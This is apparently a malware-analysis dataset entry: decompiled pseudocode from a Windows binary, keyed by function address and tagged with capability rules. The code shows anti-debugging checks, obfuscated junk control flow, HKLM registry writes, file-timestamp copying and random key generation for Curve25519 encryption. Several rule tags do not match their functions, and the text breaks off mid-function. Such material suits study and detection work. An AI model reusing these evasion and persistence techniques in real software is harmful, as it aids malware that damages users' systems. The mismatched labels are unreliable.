{
    "00401000": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401017) overlaps instruction at (ram,0x00401015)\n// \n// WARNING: Removing unreachable block (ram,0x00401111)\n\nuint __cdecl fcn.00401000(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    uint *arg_20h;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    uchar var_20h;\n    uint var_1fh;\n    \n    // [00] -r-x section size 20480 named .text\n    arg_20h = fcn.004027a0(arg_18h, arg_1ch, 0x407054, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    bVar7 = arg_20h == NULL;\n    if (bVar7) {\n        return 0;\n    }\n    if ((!bVar7) && (bVar7)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    var_20h = 0;\n    puVar5 = &var_1fh;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uVar4 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        (&var_20h)[uVar4] = uVar2;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x20);\n    puVar5 = &var_20h;\n    puVar6 = arg_20h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00404a90(arg_8h, arg_ch, arg_10h, arg_14h, &var_20h, 0x20, arg_20h);\n    fcn.00404660(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 586
    },
    "00401160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011a8) overlaps instruction at (ram,0x004011a7)\n// \n// WARNING: Removing unreachable block (ram,0x00401190)\n// WARNING: Removing unreachable block (ram,0x0040119c)\n// WARNING: Removing unreachable block (ram,0x004011a0)\n\nbool __cdecl fcn.00401160(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar uVar4;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404770();\n    uVar4 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00402530(uVar4);\n        arg_ch_01 = fcn.00402530();\n        arg_ch_02 = fcn.00402530();\n        fcn.00402330(arg_10h, arg_ch_00);\n        fcn.00402330(arg_8h, arg_ch_01);\n        fcn.00402330(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x24, &lpBuffer, arg_10h);\n        iVar2 = fcn.004028e0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x30, &lpBuffer, arg_8h);\n            iVar2 = fcn.004028e0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x30, &lpBuffer, arg_ch);\n                iVar2 = fcn.004028e0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00402330(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 690
    },
    "004012d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401438) overlaps instruction at (ram,0x00401435)\n// \n// WARNING: Removing unreachable block (ram,0x004012f5)\n// WARNING: Removing unreachable block (ram,0x004012fa)\n\nuint32_t fcn.004012d0(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    uint in_EAX;\n    uint32_t uVar5;\n    char extraout_CH;\n    int16_t extraout_CX;\n    int32_t extraout_ECX;\n    uint8_t extraout_CH_00;\n    uint8_t extraout_CH_01;\n    int32_t extraout_ECX_00;\n    uint8_t extraout_DL;\n    int16_t extraout_DX;\n    int32_t iVar6;\n    char *pcVar7;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint32_t unaff_EBX;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint16_t in_SS;\n    uint8_t uVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    char in_SF;\n    char cVar10;\n    char in_OF;\n    bool bVar11;\n    char cVar12;\n    ulong uVar13;\n    uint in_stack_ffffa14d;\n    ushort uVar14;\n    uint *arg_ch;\n    uint *puVar15;\n    uint *puVar16;\n    uint32_t *puVar17;\n    uint32_t uStack24195;\n    uint uStack64;\n    uint uVar18;\n    uint arg_10h;\n    uint arg_14h;\n    \n    uVar14 = in_stack_ffffa14d >> 0x10;\n    puVar15 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        puVar15 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n    }\n    fcn.00402570(0x423610, 8, 0x407024, 10);\n    fcn.00402570(0x423610, 8, 0x407030, 0x12);\n    bVar11 = SCARRY4(unaff_EBX, 1);\n    arg_14h = 0x407044;\n    arg_10h = 8;\n    uVar18 = 0x423610;\n    uVar13 = fcn.00402570(0x423610, 8, 0x407044, 4);\n    iVar6 = uVar13 >> 0x20;\n    if ((!bVar11) && (bVar11)) {\n        bVar11 = uVar13 == -1;\n        puVar16 = unaff_ESI + 1;\n        *puVar15 = *unaff_ESI;\n        iVar6 = 0x48680c6a;\n        unaff_ESI = puVar16;\n        if (SCARRY4(uVar13, 1)) goto code_r0x004013b2;\n    }\n    *(iVar6 + 8) = *(iVar6 + 8) + extraout_CH;\n    fcn.00402570(0x423610, uVar18, arg_10h, arg_14h);\n    fcn.00402570(0x423610, 8, 0x407054, 7);\n    bVar11 = (unaff_EBX & 0xffff) == extraout_CX;\n    unaff_EBX = unaff_EBX & 0xffff;\ncode_r0x004013b2:\n    fcn.00402570(0x423610, 8, 0x40705c, 0xb);\n    puVar15 = unaff_EBP;\n    if ((!bVar11) && (bVar11)) {\n        puVar16 = &stack0xffffffc4;\n        puVar15 = &stack0xffffffc4;\n        cVar10 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *unaff_EBP;\n            cVar10 = cVar10 + -1;\n        } while ('\\0' < cVar10);\n    }\n    fcn.00402570(0x423610, 8, 0x407068, 0xc);\n    fcn.00402570(0x423610, 8, 0x407074, 8);\n    bVar11 = false;\n    fcn.00402570(0x423610, 8, 0x40707c, 0xd);\n    if ((!bVar11) && (bVar11)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00402570(0x423610, 8, 0x40708c, 0x18);\n    fcn.00402570(0x423610, 8, 0x4070a4, 0x25);\n    uVar5 = fcn.00402570(0x423610, 8, 0x4070cc, 10);\n    puVar16 = CONCAT22(uVar14, in_SS);\n    bVar11 = false;\n    bVar9 = (uVar5 & 0xc6a18c5) == 0;\n    fcn.00402570(0x423610, 8, 0x4070d8, 0x47);\n    if ((!bVar11 && !bVar9) && (bVar11 || bVar9)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00402570(0x423610, 8, 0x4070e4, 0xd);\n    arg_ch = unaff_ESI;\n    fcn.00402570(0x423610, 8, 0x4070f4, 6);\n    uVar8 = 0;\n    bVar11 = (POPCOUNT(extraout_DL & unaff_EBX & 0xffff) & 1U) == 0;\n    uVar5 = 0x401543;\n    uVar13 = fcn.00402570(0x423610, 8, 0x4070fc, 5);\n    pcVar7 = uVar13 >> 0x20;\n    uVar18 = uVar13;\n    if ((bVar11) || (uVar5 = uVar5 & 0xffff | unaff_ESI << 0x10,  !bVar11)) {\n        uVar5 = 0xd;\n        puVar15 = 0x407104;\n        arg_ch = 0x8;\n    }\n    else {\n        out(*unaff_ESI, uVar13 >> 0x20);\n        uVar8 = in_AF;\n        do {\n            cVar10 = uVar18 >> 8;\n            uVar8 = 9 < (uVar18 & 0xf) | uVar8;\n            uVar18 = CONCAT31(CONCAT21(uVar18 >> 0x10, cVar10 - uVar8), -uVar8);\n            in_AF = uVar8;\n        } while (uVar8 || cVar10 == *pcVar7);\n    }\n    piVar1 = puVar16 + pcVar7 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar8;\n    *(extraout_ECX + 0x6a) = uVar18;\n    pcVar7 = pcVar7 + 8;\n    cVar10 = extraout_ECX >> 8;\n    cVar12 = SCARRY1(*pcVar7, cVar10);\n    *pcVar7 = *pcVar7 + cVar10;\n    cVar10 = *pcVar7 < '\\0';\n    bVar11 = *pcVar7 == '\\0';\n    uVar18 = 0x40156d;\n    fcn.00402570(0x423610, arg_ch, puVar15, uVar5);\n    if ((bVar11 || cVar12 != cVar10) || (!bVar11 && cVar12 == cVar10)) {\n        uVar18 = 0x19;\n    }\n    iVar3 = fcn.00402570(0x423610, 8, 0x407114, uVar18);\n    bVar11 = (in_SS & (extraout_DX - iVar3) + 0x1abU) == 0;\n    fcn.00402570(0x423610, 8, 0x407130, 0xf);\n    iVar6 = extraout_EDX;\n    uVar8 = extraout_CH_00;\n    if ((bVar11) || (!bVar11)) {\n        puVar16 = 0xe;\n    }\n    else {\n        uVar18 = in(extraout_EDX);\n        *puVar16 = uVar18;\n        if (&stack0xffffa161 < 1) {\n            pcVar2 = swi(0x3a);\n            (*pcVar2)();\n            iVar6 = extraout_EDX_00;\n            uVar8 = extraout_CH_01;\n        }\n    }\n    *(iVar6 + 0xe) = *(iVar6 + 0xe) ^ uVar8;\n    fcn.00402570(0x423610, 8, 0x407140, puVar16);\n    fcn.00402570(0x423610, 8, 0x407150, 0xb);\n    fcn.00402570(0x423610, 8, 0x40715c, 0xb);\n    fcn.00402570(0x423610, 8, 0x407168, 0xb);\n    iVar3 = fcn.00402570(0x423610, 8, 0x407174, 10);\n    cVar12 = '\\0';\n    uVar4 = iVar3 + (unaff_EBX & 0xffff) | 0x11a9;\n    cVar10 = uVar4 < 0;\n    bVar11 = uVar4 == 0;\n    uVar5 = fcn.00402570(0x423610, 8, 0x407180, 0xc);\n    if ((!bVar11 && cVar12 == cVar10) && (bVar11 || cVar12 != cVar10)) {\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        if (extraout_ECX_00 == 0) {\n            return uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00402570(0x423610, 8, 0x40718c, 0xe);\n    fcn.00402570(0x423610, 8, 0x40719c, 0x11);\n    fcn.00402570(0x423610, 8, 0x4071b0, 0x13);\n    fcn.00402570(0x423610, 8, 0x4071c4, 0x14);\n    fcn.00402570(0x423610, 8, 0x4071d8, 0x33);\n    bVar11 = false;\n    puVar17 = 0x423610;\n    fcn.00402570(0x423610, 8, 0x40720c, 10);\n    if ((!bVar11) && (bVar11)) {\n        *puVar17 = uStack24195;\n        return uStack24195;\n    }\n    fcn.00402570(0x423610, 8, 0x407218, 4);\n    fcn.00402570(0x423610, 8, 0x40721c, 5);\n    fcn.00402570(0x423610, 8, 0x407224, 6);\n    fcn.00402570(0x423610, 8, 0x407258, 0x2a);\n    uVar5 = fcn.00402570(0x423610, 8, 0x407284, 0xb);\n    return uVar5;\n}\n",
        "token_count": 2851
    },
    "00402330": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402330(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(var_4h + arg_8h) = iVar1 % 0x1a + 'a';\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004023a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool fcn.004023a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    uchar auStack276 [124];\n    uint uStack152;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    iVar2 = fcn.004026c0();\n    if (iVar2 == 0) {\n        return false;\n    }\n    fcn.00402080();\n    iVar2 = fcn.00402120(0x407074);\n    bVar6 = iVar2 == -1;\n    if (bVar6) {\n        fcn.004018b0();\n        *0x423638 = 1;\n        puVar4 = &stack0xfffffffc;\n        if ((!bVar6) && (puVar4 = &stack0xfffffffc,  bVar6)) {\n            puVar3 = &stack0xffffff6c;\n            puVar4 = &stack0xffffff6c;\n            cVar1 = '\\x10';\n            do {\n                puVar5 = puVar5 + -1;\n                puVar3 = puVar3 + -1;\n                *puVar3 = *puVar5;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        iVar2 = fcn.00402760();\n        if (iVar2 == 0) {\n            puVar4[-0x20] = 0;\n            puVar4[-0x80] = 0;\n            puVar5 = puVar4 + -0x1f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            puVar4[-0x60] = 0;\n            puVar5 = puVar4 + -0x7f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            puVar4[-0x40] = 0;\n            puVar5 = puVar4 + -0x5f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            puVar5 = puVar4 + -0x3f;\n            for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            iVar2 = fcn.00401160(puVar4 + -0x80, puVar4 + -0x60, puVar4 + -0x20, puVar4 + -0x40);\n            if (iVar2 != 0) {\n                iVar2 = fcn.004029b0(puVar4 + -0x20);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.00404c90(puVar4 + -0x80, puVar4 + -0x60, puVar4 + -0x20, puVar4 + -0x40);\n                    return iVar2 != 0;\n                }\n                return false;\n            }\n            return false;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 916
    },
    "004026c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004026c0(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "00402e80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402e80(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40708c, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1096
    },
    "00403bd0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403bd0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x407440;\n    var_10h = 0x407438;\n    var_ch = 0x407448;\n    var_8h = 0x407450;\n    var_4h = 0x407458;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x7430);\n    return iVar1 == 0;\n}\n",
        "token_count": 287
    },
    "00404a40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404a40(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402db0(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "00403150": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403150(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x407048;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00404610(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1153
    },
    "004018b0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401bba) overlaps instruction at (ram,0x00401bb6)\n// \n// WARNING: Removing unreachable block (ram,0x00401a6b)\n\nvoid fcn.004018b0(void)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uchar uVar3;\n    uint8_t uVar4;\n    uint uVar5;\n    uint8_t extraout_CL;\n    char extraout_CH;\n    uint8_t extraout_CH_00;\n    int16_t extraout_CX;\n    char extraout_CH_01;\n    char extraout_CH_02;\n    char extraout_CH_03;\n    uint8_t extraout_DL;\n    uint8_t extraout_DL_00;\n    uint32_t extraout_EDX;\n    uint32_t uVar7;\n    int16_t unaff_BX;\n    uint32_t unaff_EBP;\n    char *unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar8;\n    uint16_t in_ES;\n    bool bVar9;\n    uchar uVar10;\n    char cVar11;\n    uint8_t in_IF;\n    bool bVar12;\n    char cVar13;\n    bool bVar14;\n    ulong uVar15;\n    uint arg_ch;\n    uint32_t arg_10h;\n    uint arg_10h_00;\n    uint32_t uVar16;\n    int32_t iVar17;\n    uint16_t uVar18;\n    uint arg_10h_01;\n    ushort uVar19;\n    ushort uVar20;\n    ushort uVar21;\n    ushort uVar22;\n    uchar *arg_10h_02;\n    char *pcVar23;\n    char *pcVar6;\n    \n    bVar12 = false;\n    arg_10h_02 = unaff_EDI;\n    pcVar23 = unaff_ESI;\n    fcn.00402570(0x423610, 8, 0x407010, 0x11);\n    fcn.00402570(0x423610, 8, 0x40722c, 0xf);\n    fcn.00402570(0x423610, 8, 0x40723c, 0x1a);\n    fcn.00402570(0x423610, 8, 0x407290, 10);\n    fcn.00402570(0x423610, 8, 0x40729c, 0xb);\n    bVar9 = extraout_CH == unaff_BX;\n    fcn.00402570(0x423610, 8, 0x4072a8, 8);\n    if ((!bVar9) && (bVar9)) {\n        bVar12 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    fcn.00402570(0x423610, 8, 0x4072b0, 9);\n    fcn.00402570(0x423610, 8, 0x4072bc, 9);\n    fcn.00402570(0x423610, 8, 0x4072c8, 9);\n    bVar9 = false;\n    cVar13 = '\\0';\n    cVar11 = (extraout_CH_00 | extraout_DL | 0x1f) < '\\0';\n    uVar5 = fcn.00402570(0x423610, 8, 0x4072d4, 0xc);\n    if ((!bVar9) && (bVar9)) {\n        out(0xbd, uVar5);\n        return;\n    }\n    arg_10h_00 = 0x4072e0;\n    uVar5 = 8;\n    arg_10h = 0x423610;\n    uVar3 = fcn.00402570(0x423610, 8, 0x4072e0, 3);\n    if ((cVar13 == cVar11) && (cVar13 != cVar11)) {\n        arg_10h = arg_10h & 0xffff0000 | in_ES;\n        unaff_ESI = unaff_ESI + -1;\n        puVar8 = unaff_EDI | unaff_EBP;\n        unaff_EDI = puVar8 + bVar12 * -2 + 1;\n        *puVar8 = uVar3;\n    }\n    arg_ch = 10;\n    fcn.00402570(0x423610, 8, 0x4072e4, 10);\n    fcn.00402570(0x423610, 8, 0x4072f0, 0x40);\n    uVar3 = false;\n    bVar14 = false;\n    bVar9 = unaff_BX == extraout_CX;\n    uVar21 = 0xc;\n    uVar22 = 0;\n    uVar19 = 8;\n    uVar20 = 0;\n    arg_10h_01 = 0x423610;\n    uVar16 = 0x401ac8;\n    uVar15 = fcn.00402570(0x423610, 8, 0x407330, 0xc);\n    uVar7 = uVar15 >> 0x20;\n    if (bVar14) {\ncode_r0x00401aec:\n        iVar17 = 0xb;\n        arg_10h_00 = 0x40733c;\n        uVar5 = 8;\ncode_r0x00401af2:\n        *(uVar7 + 8) = *(uVar7 + 8) + extraout_CH_01;\n        arg_10h = 0x423610;\n        arg_ch = 0x401aff;\n        fcn.00402570(0x423610, uVar5, arg_10h_00, iVar17);\n        uVar3 = extraout_CL < extraout_DL_00;\n        bVar9 = SBORROW1(extraout_CL, '\\x01');\n        uVar10 = extraout_CL == 1;\n        uVar21 = 4;\n        uVar22 = 0;\n        uVar19 = 8;\n        uVar20 = 0;\n        arg_10h_01 = 0x423610;\n        fcn.00402570(0x423610, 8, 0x407348, 4);\n        uVar7 = extraout_EDX;\n        cVar11 = extraout_CH_02;\n        if (!bVar9) {\n            iVar17 = extraout_EDX << 0x10;\n            puVar8 = unaff_EDI;\ncode_r0x00401b37:\n            uVar18 = iVar17 >> 0x10;\n            uVar7 = uVar7 & 0xffff0000 | uVar18;\n            if 